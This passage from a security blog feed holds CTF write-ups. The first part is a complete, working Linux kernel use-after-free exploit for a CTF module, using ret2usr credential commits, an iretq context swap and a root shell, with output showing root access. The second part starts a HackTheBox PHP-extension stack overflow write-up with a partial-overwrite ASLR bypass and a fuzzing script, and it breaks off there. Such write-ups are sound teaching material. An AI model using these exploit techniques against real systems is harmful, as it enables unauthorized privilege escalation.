     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn&apos;t reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts(&quot;[*] creating note 0: fail pls&quot;);
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    // ...
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The new code that triggers UAF</span></p></figcaption></figure><p>Then, we&apos;re triggering the function call to <code>encrypt_func</code> by using <code>KNOTE_ENCRYPT</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    // ...
}

void main()
{
    // ...
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts(&quot;[*] calling (hopefully overwrited) encrypt function&quot;);
    cmd_send(KNOTE_ENCRYPT, 0, &quot;idc4&quot;, 5);

    puts(&quot;[-] exploit failed :(&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code triggering the exploit</span></p></figcaption></figure><p>Now, coming back to <code>set_ctx_reg()</code> and <code>privesc_ctx_swp()</code>. When we commit the code execution attack in the kmodule, we are in <strong>kernel space </strong>whilst we want to run a shell as <strong>root</strong> in <strong>userland</strong>. In order to get our beloved shell, we need to perform a <strong>context swap</strong> from kernel to userland. Such context swaps happen with every system call being made in the kernel so it&apos;s very important. In order to keep this write-up relatively short, you can read more about context swapping in the <a href="https://medium.com/geekculture/linux-cpu-context-switch-deep-dive-764bfdae4f01" rel="noreferrer">context swapping blogpost</a> by geekculture. </p><p>Since these functions are very standard and used in most kernel pwn challenges I made it a header file:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long prepare_kernel_cred = 0xDEADC0D3;
long commit_creds = 0xDEADC0DE;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(&quot;.intel_syntax noprefix;&quot;
            &quot;mov _proc_cs, cs;&quot;
            &quot;mov _proc_ss, ss;&quot;
            &quot;mov _proc_rsp, rsp;&quot;
            &quot;pushf;&quot; // push rflags
            &quot;pop _proc_rflags;&quot;
            &quot;.att_syntax&quot;);

    printf(&quot;[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n&quot;, _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}


void spawn_shell()
{
    puts(&quot;[+] Hello Userland!&quot;);
    int uid = getuid();
    if (uid == 0)
        printf(&quot;[+] UID: %d (root poggers)\n&quot;, uid);
    else {
        printf(&quot;[!] UID: %d (epic fail)\n&quot;, uid);
    }

    puts(&quot;[*] starting shell&quot;);
    system(&quot;/bin/sh&quot;);

    puts(&quot;[*] quitting exploit&quot;);
    exit(0); // avoid ugly segfault
}

void privesc_ctx_swp()
{
    __asm__(&quot;.intel_syntax noprefix;&quot;
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they&apos;ll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            &quot;xor rdi, rdi;&quot;
            &quot;movabs rax, prepare_kernel_cred;&quot;
            &quot;call rax;&quot; // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            &quot;mov rdi, rax;&quot; // RAX contains cred pointer
            &quot;movabs rax, commit_creds;&quot;
            &quot;call rax;&quot;

            // setup the context swapping
            &quot;swapgs;&quot; // swap GS to userland

            &quot;mov r15, _proc_ss;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rsp;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rflags;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_cs;&quot;
            &quot;push r15;&quot;
            &quot;lea r15, spawn_shell;&quot; // lea rip, spawn_shell ; when returning to userland
            &quot;push r15;&quot;
            &quot;iretq;&quot; // swap context to userland
            &quot;.att_syntax;&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Content of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>kpwn.c</span></code></p></figcaption></figure><p>Basically in a nutshell, the context swap requires the registers <code>ss</code>, <code>rsp</code>, <code>rflags</code> and <code>cs</code> <strong>from userland</strong>, since they are mission critical for returning to userland context. We store those registers in the <code>set_ctx_reg()</code> function:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(&quot;.intel_syntax noprefix;&quot;
            &quot;mov _proc_cs, cs;&quot;
            &quot;mov _proc_ss, ss;&quot;
            &quot;mov _proc_rsp, rsp;&quot;
            &quot;pushf;&quot; // push rflags
            &quot;pop _proc_rflags;&quot;
            &quot;.att_syntax&quot;);

    printf(&quot;[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n&quot;, _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>set_ctx_reg()</span></code><span style="white-space: pre-wrap;"> content</span></p></figcaption></figure><p>After we set them, we can use our own privesc and context swap function which also sets the new userland execution pointer. Keep in mind that the following code snippet uses global variables in the assembly. The code starts off by calling <code>prepare_kernel_cred(0)</code> (which prepares the credentials to be set to UID 0 and GID 0) and then calls <code>commit_creds(creds)</code> to set the process credentials indefinitely. At last, it prepares the context swap registers and performs the context swap.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void privesc_ctx_swp()
{
    __asm__(&quot;.intel_syntax noprefix;&quot;
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they&apos;ll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            &quot;xor rdi, rdi;&quot;
            &quot;movabs rax, prepare_kernel_cred;&quot;
            &quot;call rax;&quot; // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            &quot;mov rdi, rax;&quot; // RAX contains cred pointer
            &quot;movabs rax, commit_creds;&quot;
            &quot;call rax;&quot;

            // setup the context swapping
            &quot;swapgs;&quot; // swap GS to userland

            &quot;mov r15, _proc_ss;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rsp;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_rflags;&quot;
            &quot;push r15;&quot;
            &quot;mov r15, _proc_cs;&quot;
            &quot;push r15;&quot;
            &quot;lea r15, spawn_shell;&quot; // lea rip, spawn_shell ; when returning to userland
            &quot;push r15;&quot;
            &quot;iretq;&quot; // swap context to userland
            &quot;.att_syntax;&quot;);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_ctx_swp()</span></code><span style="white-space: pre-wrap;"> function</span></p></figcaption></figure><p>This sets the new RIP to <code>spawn_shell</code>, which contains our userland code to spawn a shell:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void spawn_shell()
{
    puts(&quot;[+] Hello Userland!&quot;);
    int uid = getuid();
    if (uid == 0)
        printf(&quot;[+] UID: %d (root poggers)\n&quot;, uid);
    else {
        printf(&quot;[!] UID: %d (epic fail)\n&quot;, uid);
    }

    puts(&quot;[*] starting shell&quot;);
    system(&quot;/bin/sh&quot;);

    puts(&quot;[*] quitting exploit&quot;);
    exit(0); // avoid ugly segfault
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>spawn_shell()</span></code><span style="white-space: pre-wrap;"> function which calls /bin/sh from userland</span></p></figcaption></figure><p>In our exploit we prepared the userland context registers, made a fake UAF knote object that would trigger <code>privesc_ctx_swp</code>, and set the addresses for the kernel functions <code>prepare_kernel_cred</code> and <code>commit_creds</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">A subsection of the exploit which sets the privesc up</span></p></figcaption></figure><p>Then, I tested the exploit locally by compiling it using <code>compress.sh</code> (given earlier in this post):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">~ $ whoami
user
~ $ /exploit
exploit         exploit_easy    exploit_easy.c  exploit_real.c
~ $ /exploit_easy
[*] creating note 0: fail pls
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; -1
[+] CS: 0x33, SS: 0x2b, RSP: 0x7fff3d3605e0, RFLAGS: 0x246
[*] new knote_t size: 32
[*] allocating malicious payload knote
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; 0
[*] calling (hopefully overwrited) encrypt function
[+] Hello Userland!
[+] UID: 0 (root poggers)
[*] starting shell
/bin/sh: can&apos;t access tty; job control turned off
/home/user # whoami
root
/home/user #</code></pre><figcaption><p><span style="white-space: pre-wrap;">Exploit proof-of-concept (PoC)</span></p></figcaption></figure><p>If you want to try the exploit yourself, here&apos;s the complete source code for <code>exploit.c</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include &quot;kpwn.c&quot;


int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf(&quot;ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n&quot;, FD_KNOTE, cmd, &amp;user, retv);
}

void main()
{
    FD_KNOTE = open(&quot;/dev/knote&quot;, O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts(&quot;main(): open failed&quot;);
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn&apos;t reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts(&quot;[*] creating note 0: fail pls&quot;);
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = &quot;idc3&quot;;
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf(&quot;[*] new knote_t size: %lu\n&quot;, sizeof(knote_t));
    puts(&quot;[*] allocating malicious payload knote&quot;);
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts(&quot;[*] calling (hopefully overwrited) encrypt function&quot;);
    cmd_send(KNOTE_ENCRYPT, 0, &quot;idc4&quot;, 5);

    puts(&quot;[-] exploit failed :(&quot;);
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Complete </span><code spellcheck="false" style="white-space: pre-wrap;"><span>exploit.c</span></code></p></figcaption></figure><p>Now it&apos;s time to perform the exploit on the remote machine. I wisely chose <code>musl-gcc</code> as the compiler in <code>compress.sh</code> since it decreases the size of static builds A LOT. The static binary sizes from <code>gcc</code> and <code>musl-gcc</code> are respectfully <code>800000</code> bytes and <code>34000</code> bytes. In order to transfer the exploit to the remote machine, I used <code>encode.sh</code> to encode the exploit binary, <strong>copy it to clipboard</strong> and decoded it using BASH utilities on the remote machine:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">tar -czO $1 | base64 -w160


echo &quot;\n\n===== TO DECODE =====&quot; &gt; /dev/stderr
echo &quot;echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit&quot; &gt; /dev/stderr
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> used to transfer files from local machine to the remote CTF box</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ encode.sh initramfs/exploit | xsel -b


===== TO DECODE =====
echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-concept of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> to encode the binary</span></p></figcaption></figure><h2 id="afterword">Afterword</h2><p>I really hope you enjoyed the challenge and write-up as much as I did. Please let me know on <a href="https://twitter.com/notselwyn">Twitter</a> if you want me to make a write-up about exploiting this CTF with <em>real</em> kernel primitives like <code>seq_operations</code> and <code>setxattr</code>. </p><p>If you like this pwn content, please checkout the <a href="https://pwning.tech/blacksmith/">HackTheBox - Blacksmith</a> write-up, or checkout the <a href="https://pwning.tech/tag/heap-memory">Heap Memory</a> and <a href="https://pwning.tech/tag/linux-kernel/">Linux Kernel </a>tag pages on the site to read more kernel related blogposts. </p>]]></content:encoded></item><item><title><![CDATA[Superfast (HackTheBox)]]></title><description><![CDATA[<p>Hey folks. In this write-up, we&apos;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&apos;re going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description</p>]]></description><link>https://pwning.tech/superfast/</link><guid isPermaLink="false">658f44f8d32e980001de21ec</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[ROP chains]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[BusinessCTF2022]]></category><category><![CDATA[ASLR]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Mon, 28 Nov 2022 13:21:02 GMT</pubDate><content:encoded><![CDATA[<p>Hey folks. In this write-up, we&apos;re going to discuss the Superfast challenge in HackTheBox which was part of the HackTheBox Business CTF 2022. We&apos;re going to perform a <strong>single-byte overwrite</strong> to <strong>bypass ASLR</strong>, <strong>leak stack pointers</strong>, and perform a <strong>Return Oriented Programming </strong>(ROP) chain. The description of the challenge is:</p><blockquote>We&apos;ve tracked connections made from an infected workstation back to this server. We believe it is running a C2 checkin interface, the source code of which we aquired from a temporarily exposed Git repository several months ago.Apparently the engineers behind it are obsessed with speed, extending their programs with low-level code. We think in their search for speed they might have cut some corners - can you find a way in?</blockquote><p>I really enjoyed pwning this challenge since it has a unique and quite realistic target which I haven&apos;t seen before in CTFs.</p><h1 id="index">Index</h1><ul><li>First looks</li><li>Finding primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We&apos;re given a PHP file with a shared object (.so) written in C, and we&apos;re given a source directory for the shared object.</p><figure class="kg-card kg-code-card"><pre><code>.
&#x251C;&#x2500;&#x2500; build_docker.sh
&#x251C;&#x2500;&#x2500; challenge
&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; index.php
&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; php_logger.so
&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; start.sh
&#x251C;&#x2500;&#x2500; Dockerfile
&#x2514;&#x2500;&#x2500; src
    &#x251C;&#x2500;&#x2500; build.sh
    &#x251C;&#x2500;&#x2500; config.m4
    &#x251C;&#x2500;&#x2500; php_logger.c
    &#x2514;&#x2500;&#x2500; php_logger.h

2 directories, 9 files
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Directories given with the challenge</span></p></figcaption></figure><p>In <code>/challenge/start.sh</code> we can see that the challenge code gets bootstrapped using:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">#!/bin/sh
while true; do php -dextension=/php_logger.so -S 0.0.0.0:1337; done</code></pre><figcaption><p><span style="white-space: pre-wrap;">The content of start.sh</span></p></figcaption></figure><p>We can see that PHP loads <code>php_logger.so</code> as a binary extension for the webserver.</p><h1 id="finding-primitives">Finding primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork.</p><h3 id="analysing-indexphp">Analysing index.php</h3><p>The content of index.php (below) checks for a header called <code>Cmd-Key</code> and a parameter <code>cmd</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-php">&lt;?php
if (isset($_SERVER[&apos;HTTP_CMD_KEY&apos;]) &amp;&amp; isset($_GET[&apos;cmd&apos;])) {
	$key = intval($_SERVER[&apos;HTTP_CMD_KEY&apos;]);
	if ($key &lt;= 0 || $key &gt; 255) {
		http_response_code(400);
	} else {
		log_cmd($_GET[&apos;cmd&apos;], $key);
	}
} else {
	http_response_code(400);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Content of index.php</span></p></figcaption></figure><p>One of the most important stages of exploit development is making a reproducing environment. Considering I want to run GDB on <code>php_logger.so</code>, I will run the challenge without Docker. I can run the PHP <code>index.php</code> with <code>php -dextension=./php_logger.so -S 0.0.0.0:1337</code> in <code>/challenge/</code> and I can send the HTTP request using <code>curl &apos;</code><a href="http://127.0.0.1:1337?cmd=123"><code>http://127.0.0.1:1337/index.php?cmd=123</code></a><code>&apos; -H &apos;Cmd-Key: 123</code>. We can see it succeeds because it returns a 200 status code. </p><figure class="kg-card kg-code-card"><pre><code>[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Accepted
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 [200]: GET /?cmd=123
[Sat Nov 26 20:04:55 2022] 127.0.0.1:43846 Closing
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Verbose output of the PHP webserver</span></p></figcaption></figure><p>Regarding functionality, we can see that <code>index.php</code> calls <code>log_cmd($cmd, $key)</code> with <code>0 &lt; $key &lt; 256</code>. </p><h3 id="analyzing-phploggerso">Analyzing php_logger.so</h3><p>We can find the source code of <code>php_logger.so</code> in <code>/src/php_logger.c</code>. Under which, we can find the source code of <code>log_cmd()</code> as well. We can see that log_cmd() retrieves function arguments using <code>zend_parse_parameters()</code>. Then, it calls <code>decrypt($cmd, $cmdlen, $key)</code> and - if the return is valid - appends to the <code>/tmp/log</code> file.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">PHP_FUNCTION(log_cmd) {
    char* input;
    zend_string* res;
    size_t size;
    long key;
    if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;sl&quot;, &amp;input, &amp;size, &amp;key) == FAILURE) {
        RETURN_NULL();
    }
    res = decrypt(input, size, (uint8_t)key);
    if (!res) {
        print_message(&quot;Invalid input provided\n&quot;);
    } else {
        FILE* f = fopen(&quot;/tmp/log&quot;, &quot;a&quot;);
        fwrite(ZSTR_VAL(res), ZSTR_LEN(res), 1, f);
        fclose(f);
    }
    RETURN_NULL();
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Source code of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>log_cmd()</span></code></p></figcaption></figure><p>This function does look safe, so the vulnerability is in <code>decrypt(input, size, key)</code>. This function checks if the size of the command is less than the size of the stack buffer. If it is more it will return, but if it is less it will memcpy() and XOR the buffer with the key. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    if (sizeof(buffer) - size &gt; 0) {
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i &lt; sizeof(buffer) - 1; i++) {
        buffer[i] ^= key;
    }
    return zend_string_init(buffer, strlen(buffer), 0);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Source code of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>decrypt()</span></code></p></figcaption></figure><p>We can see that <code>sizeof(buffer) - size &gt; 0</code> is used for the size check. However, <code>sizeof()</code> returns <code>size_t</code>, which is an <strong>unsigned </strong>integer on 32-bit and (in this case) an <strong>unsigned</strong> long on 64-bit. Since we are essentially doing <code>ulong - int &gt; int</code>, we are using an unsigned value as a base value which means the value will wrap around. For example, in this case <code>(uint)0 - (int)1</code> would become <code>2**32-1</code>, instead of <code>-1</code>. A practical example would be the one below. The output of the program is  <code>4294967295 1</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
{
    unsigned int a = 5;
    int b = 6;

    printf(&quot;%u %d&quot;, a - b, a - b &gt; 0);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Demo of interaction between (unsigned) integers</span></p></figcaption></figure><p>That means that <code>sizeof(buffer) - size &gt; 0)</code> is always true, unless <code>sizeof(buffer) == size</code>. The result of that is a buffer overflow on the stack which we can leverage for a <strong>control flow hijacking primitive</strong>. Using Ghidra - the reverse engineering suite developed by the NSA - we can see that the offset from the buffer to the return address on the stack is 0x98 (152) bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2022/11/image-6.png" class="kg-image" alt loading="lazy" width="722" height="664" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-6.png 600w, https://pwning.tech/content/images/2022/11/image-6.png 722w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Stack variable offsets in Ghidra</span></figcaption></figure><p>However, ASLR is enabled. That means that we cannot guess the library&apos;s memory address and hence cannot guess a return address for control flow hijacking. However, the smallest 12 bits of an address are <strong>not random</strong>,<strong> </strong>and thus can we reliably overwrite 12 bits of the return address. Say our normal return address would be <code>0x555555559a1e</code>, in the next program, it could be <code>0x55555123fa1e</code>, but the <code>0xa1e</code> at the end doesn&apos;t change, because it&apos;s the smallest 12 bits. </p><p>The reason only the first 12 bits of the address don&apos;t change, is because they point to 4096 bytes (2 ** 12 bits), which is the page size. The kernel - the manager of ASLR - can&apos;t work with addresses smaller than 4096 bytes.   </p><p>Sadly, we can only write bundles of 8 bits (1 byte) at a time considering we&apos;re working with a <code>char</code> data type. This means we could only overwrite the <code>0x1e</code> part of the addresses listed above, which narrows our possible return address area. </p><p>In Ghidra, we can figure out that the return address from <code>decrypt()</code> to <code>log_cmd()</code> (without ASLR) is equal <code>0x1014129</code>. This means our scope of possible return addresses ranges from <code>0x1014100</code> to <code>0x10141ff</code>. </p><pre><code class="language-nasm">      0010141e 48 89 ce     MOV       param_2,RCX
      00101421 48 89 c7     MOV       param_1,RAX
      00101424 e8 07 fc     CALL      decrypt
               ff ff
      00101429 48 89 44     MOV       qword ptr [RSP + local_10],RAX
               24 38
      0010142e 48 83 7c     CMP       qword ptr [RSP + local_10],0x0
               24 38 00
</code></pre><p>The code in our return scope is the following. We can see that <code>decrypt()</code> is called, <code>print_message()</code> is called and a bunch of file IO functions. Internally, <code>print_message()</code> is a wrapper for <code>php_printf()</code>: the <a href="https://www.php.net/manual/en/function.printf.php">printf()</a> function in PHP. This is interesting because it outputs to the HTTP response body, which means that we can <strong>leak pointers</strong>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    *(undefined4 *)(param_2 + 8) = 1;
  }
  else {
    iVar1 = decrypt(local_20,local_28,(size_t *)(local_30 &amp; 0xff),local_28,(size_t)inlen);
    local_10 = CONCAT44(extraout_var,iVar1);
    if (local_10 == 0) {
      print_message(&quot;Invalid input provided\n&quot;);
    }
    else {
      local_18 = fopen(&quot;/tmp/log&quot;,&quot;a&quot;);
      fwrite((void *)(local_10 + 0x18),*(size_t *)(local_10 + 0x10),1,local_18);
      fclose(local_18);
    }
    *(undefined4 *)(param_2 + 8) = 1;
  }
  return;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">C decompilation of our return scope&#xA0;</span></p></figcaption></figure><p>However, in order to leak pointers with <code>print_message()</code>, we need to set the RDI register to the printf format string. Fortunately, the RDI register is set to the <code>input</code> argument of <code>decrypt(char* buf, size_t size, uint8_t key)</code> at <code>0x101390</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00101385 48 8b 84     MOV       RAX,qword ptr [RSP + local_18]
               24 a0 00 
               00 00
      0010138d 48 89 c6     MOV       inputlen,RAX
      00101390 48 89 cf     MOV       input,param_4
      00101393 e8 e8 fc     CALL      &lt;EXTERNAL&gt;::memcpy
               ff ff
      00101398 48 8b 54     MOV       key,qword ptr [RSP + local_58]
               24 60
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Assembly code which moves the input into the RDI register</span></p></figcaption></figure><p>When I try to fuzz using a script, I receive the following output: </p><figure class="kg-card kg-code-card"><pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x81\xd5\x84U\x80~</code></pre><figcaption><p><span style="white-space: pre-wrap;">Fuzzing output</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor
import requests

xorkey = 1

s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

# offset = 152 
payload = b&quot;A&quot;*152 + b&quot;\x40&quot;
content = s.get(b&quot;http://127.0.0.1:1337?cmd=&quot;+payload, headers=headers).content
print(xor(content, xorkey))</code></pre><figcaption><p><span style="white-space: pre-wrap;">Script used to fuzz</span></p></figcaption></figure><p>However, when we remove the <code>xor()</code> function call, we can see that the end of the response is an address like <code>b&apos;A\x80\xd4\x85T\x81\x7f&apos;</code>. Using <code>print(hex(u64(content[63:].ljust(8, b&apos;\x00&apos;))))</code> we can translate it to <code>0x7f815485d48041</code>. In order to identify where this leak happens, we can start a GDB server. We leak the address <code>0x7f651305f54041</code> and in GDB we can see with <code>vmmap</code> (in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>) that this falls under <code>0x7f6513000000     0x7f6513200000 rw-p   200000      0 [anon_7f6513000]</code>. Since this isn&apos;t executable it&apos;s irrelevant for the ROP chain. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">from pwn import xor, gdb, u64
import requests
import time

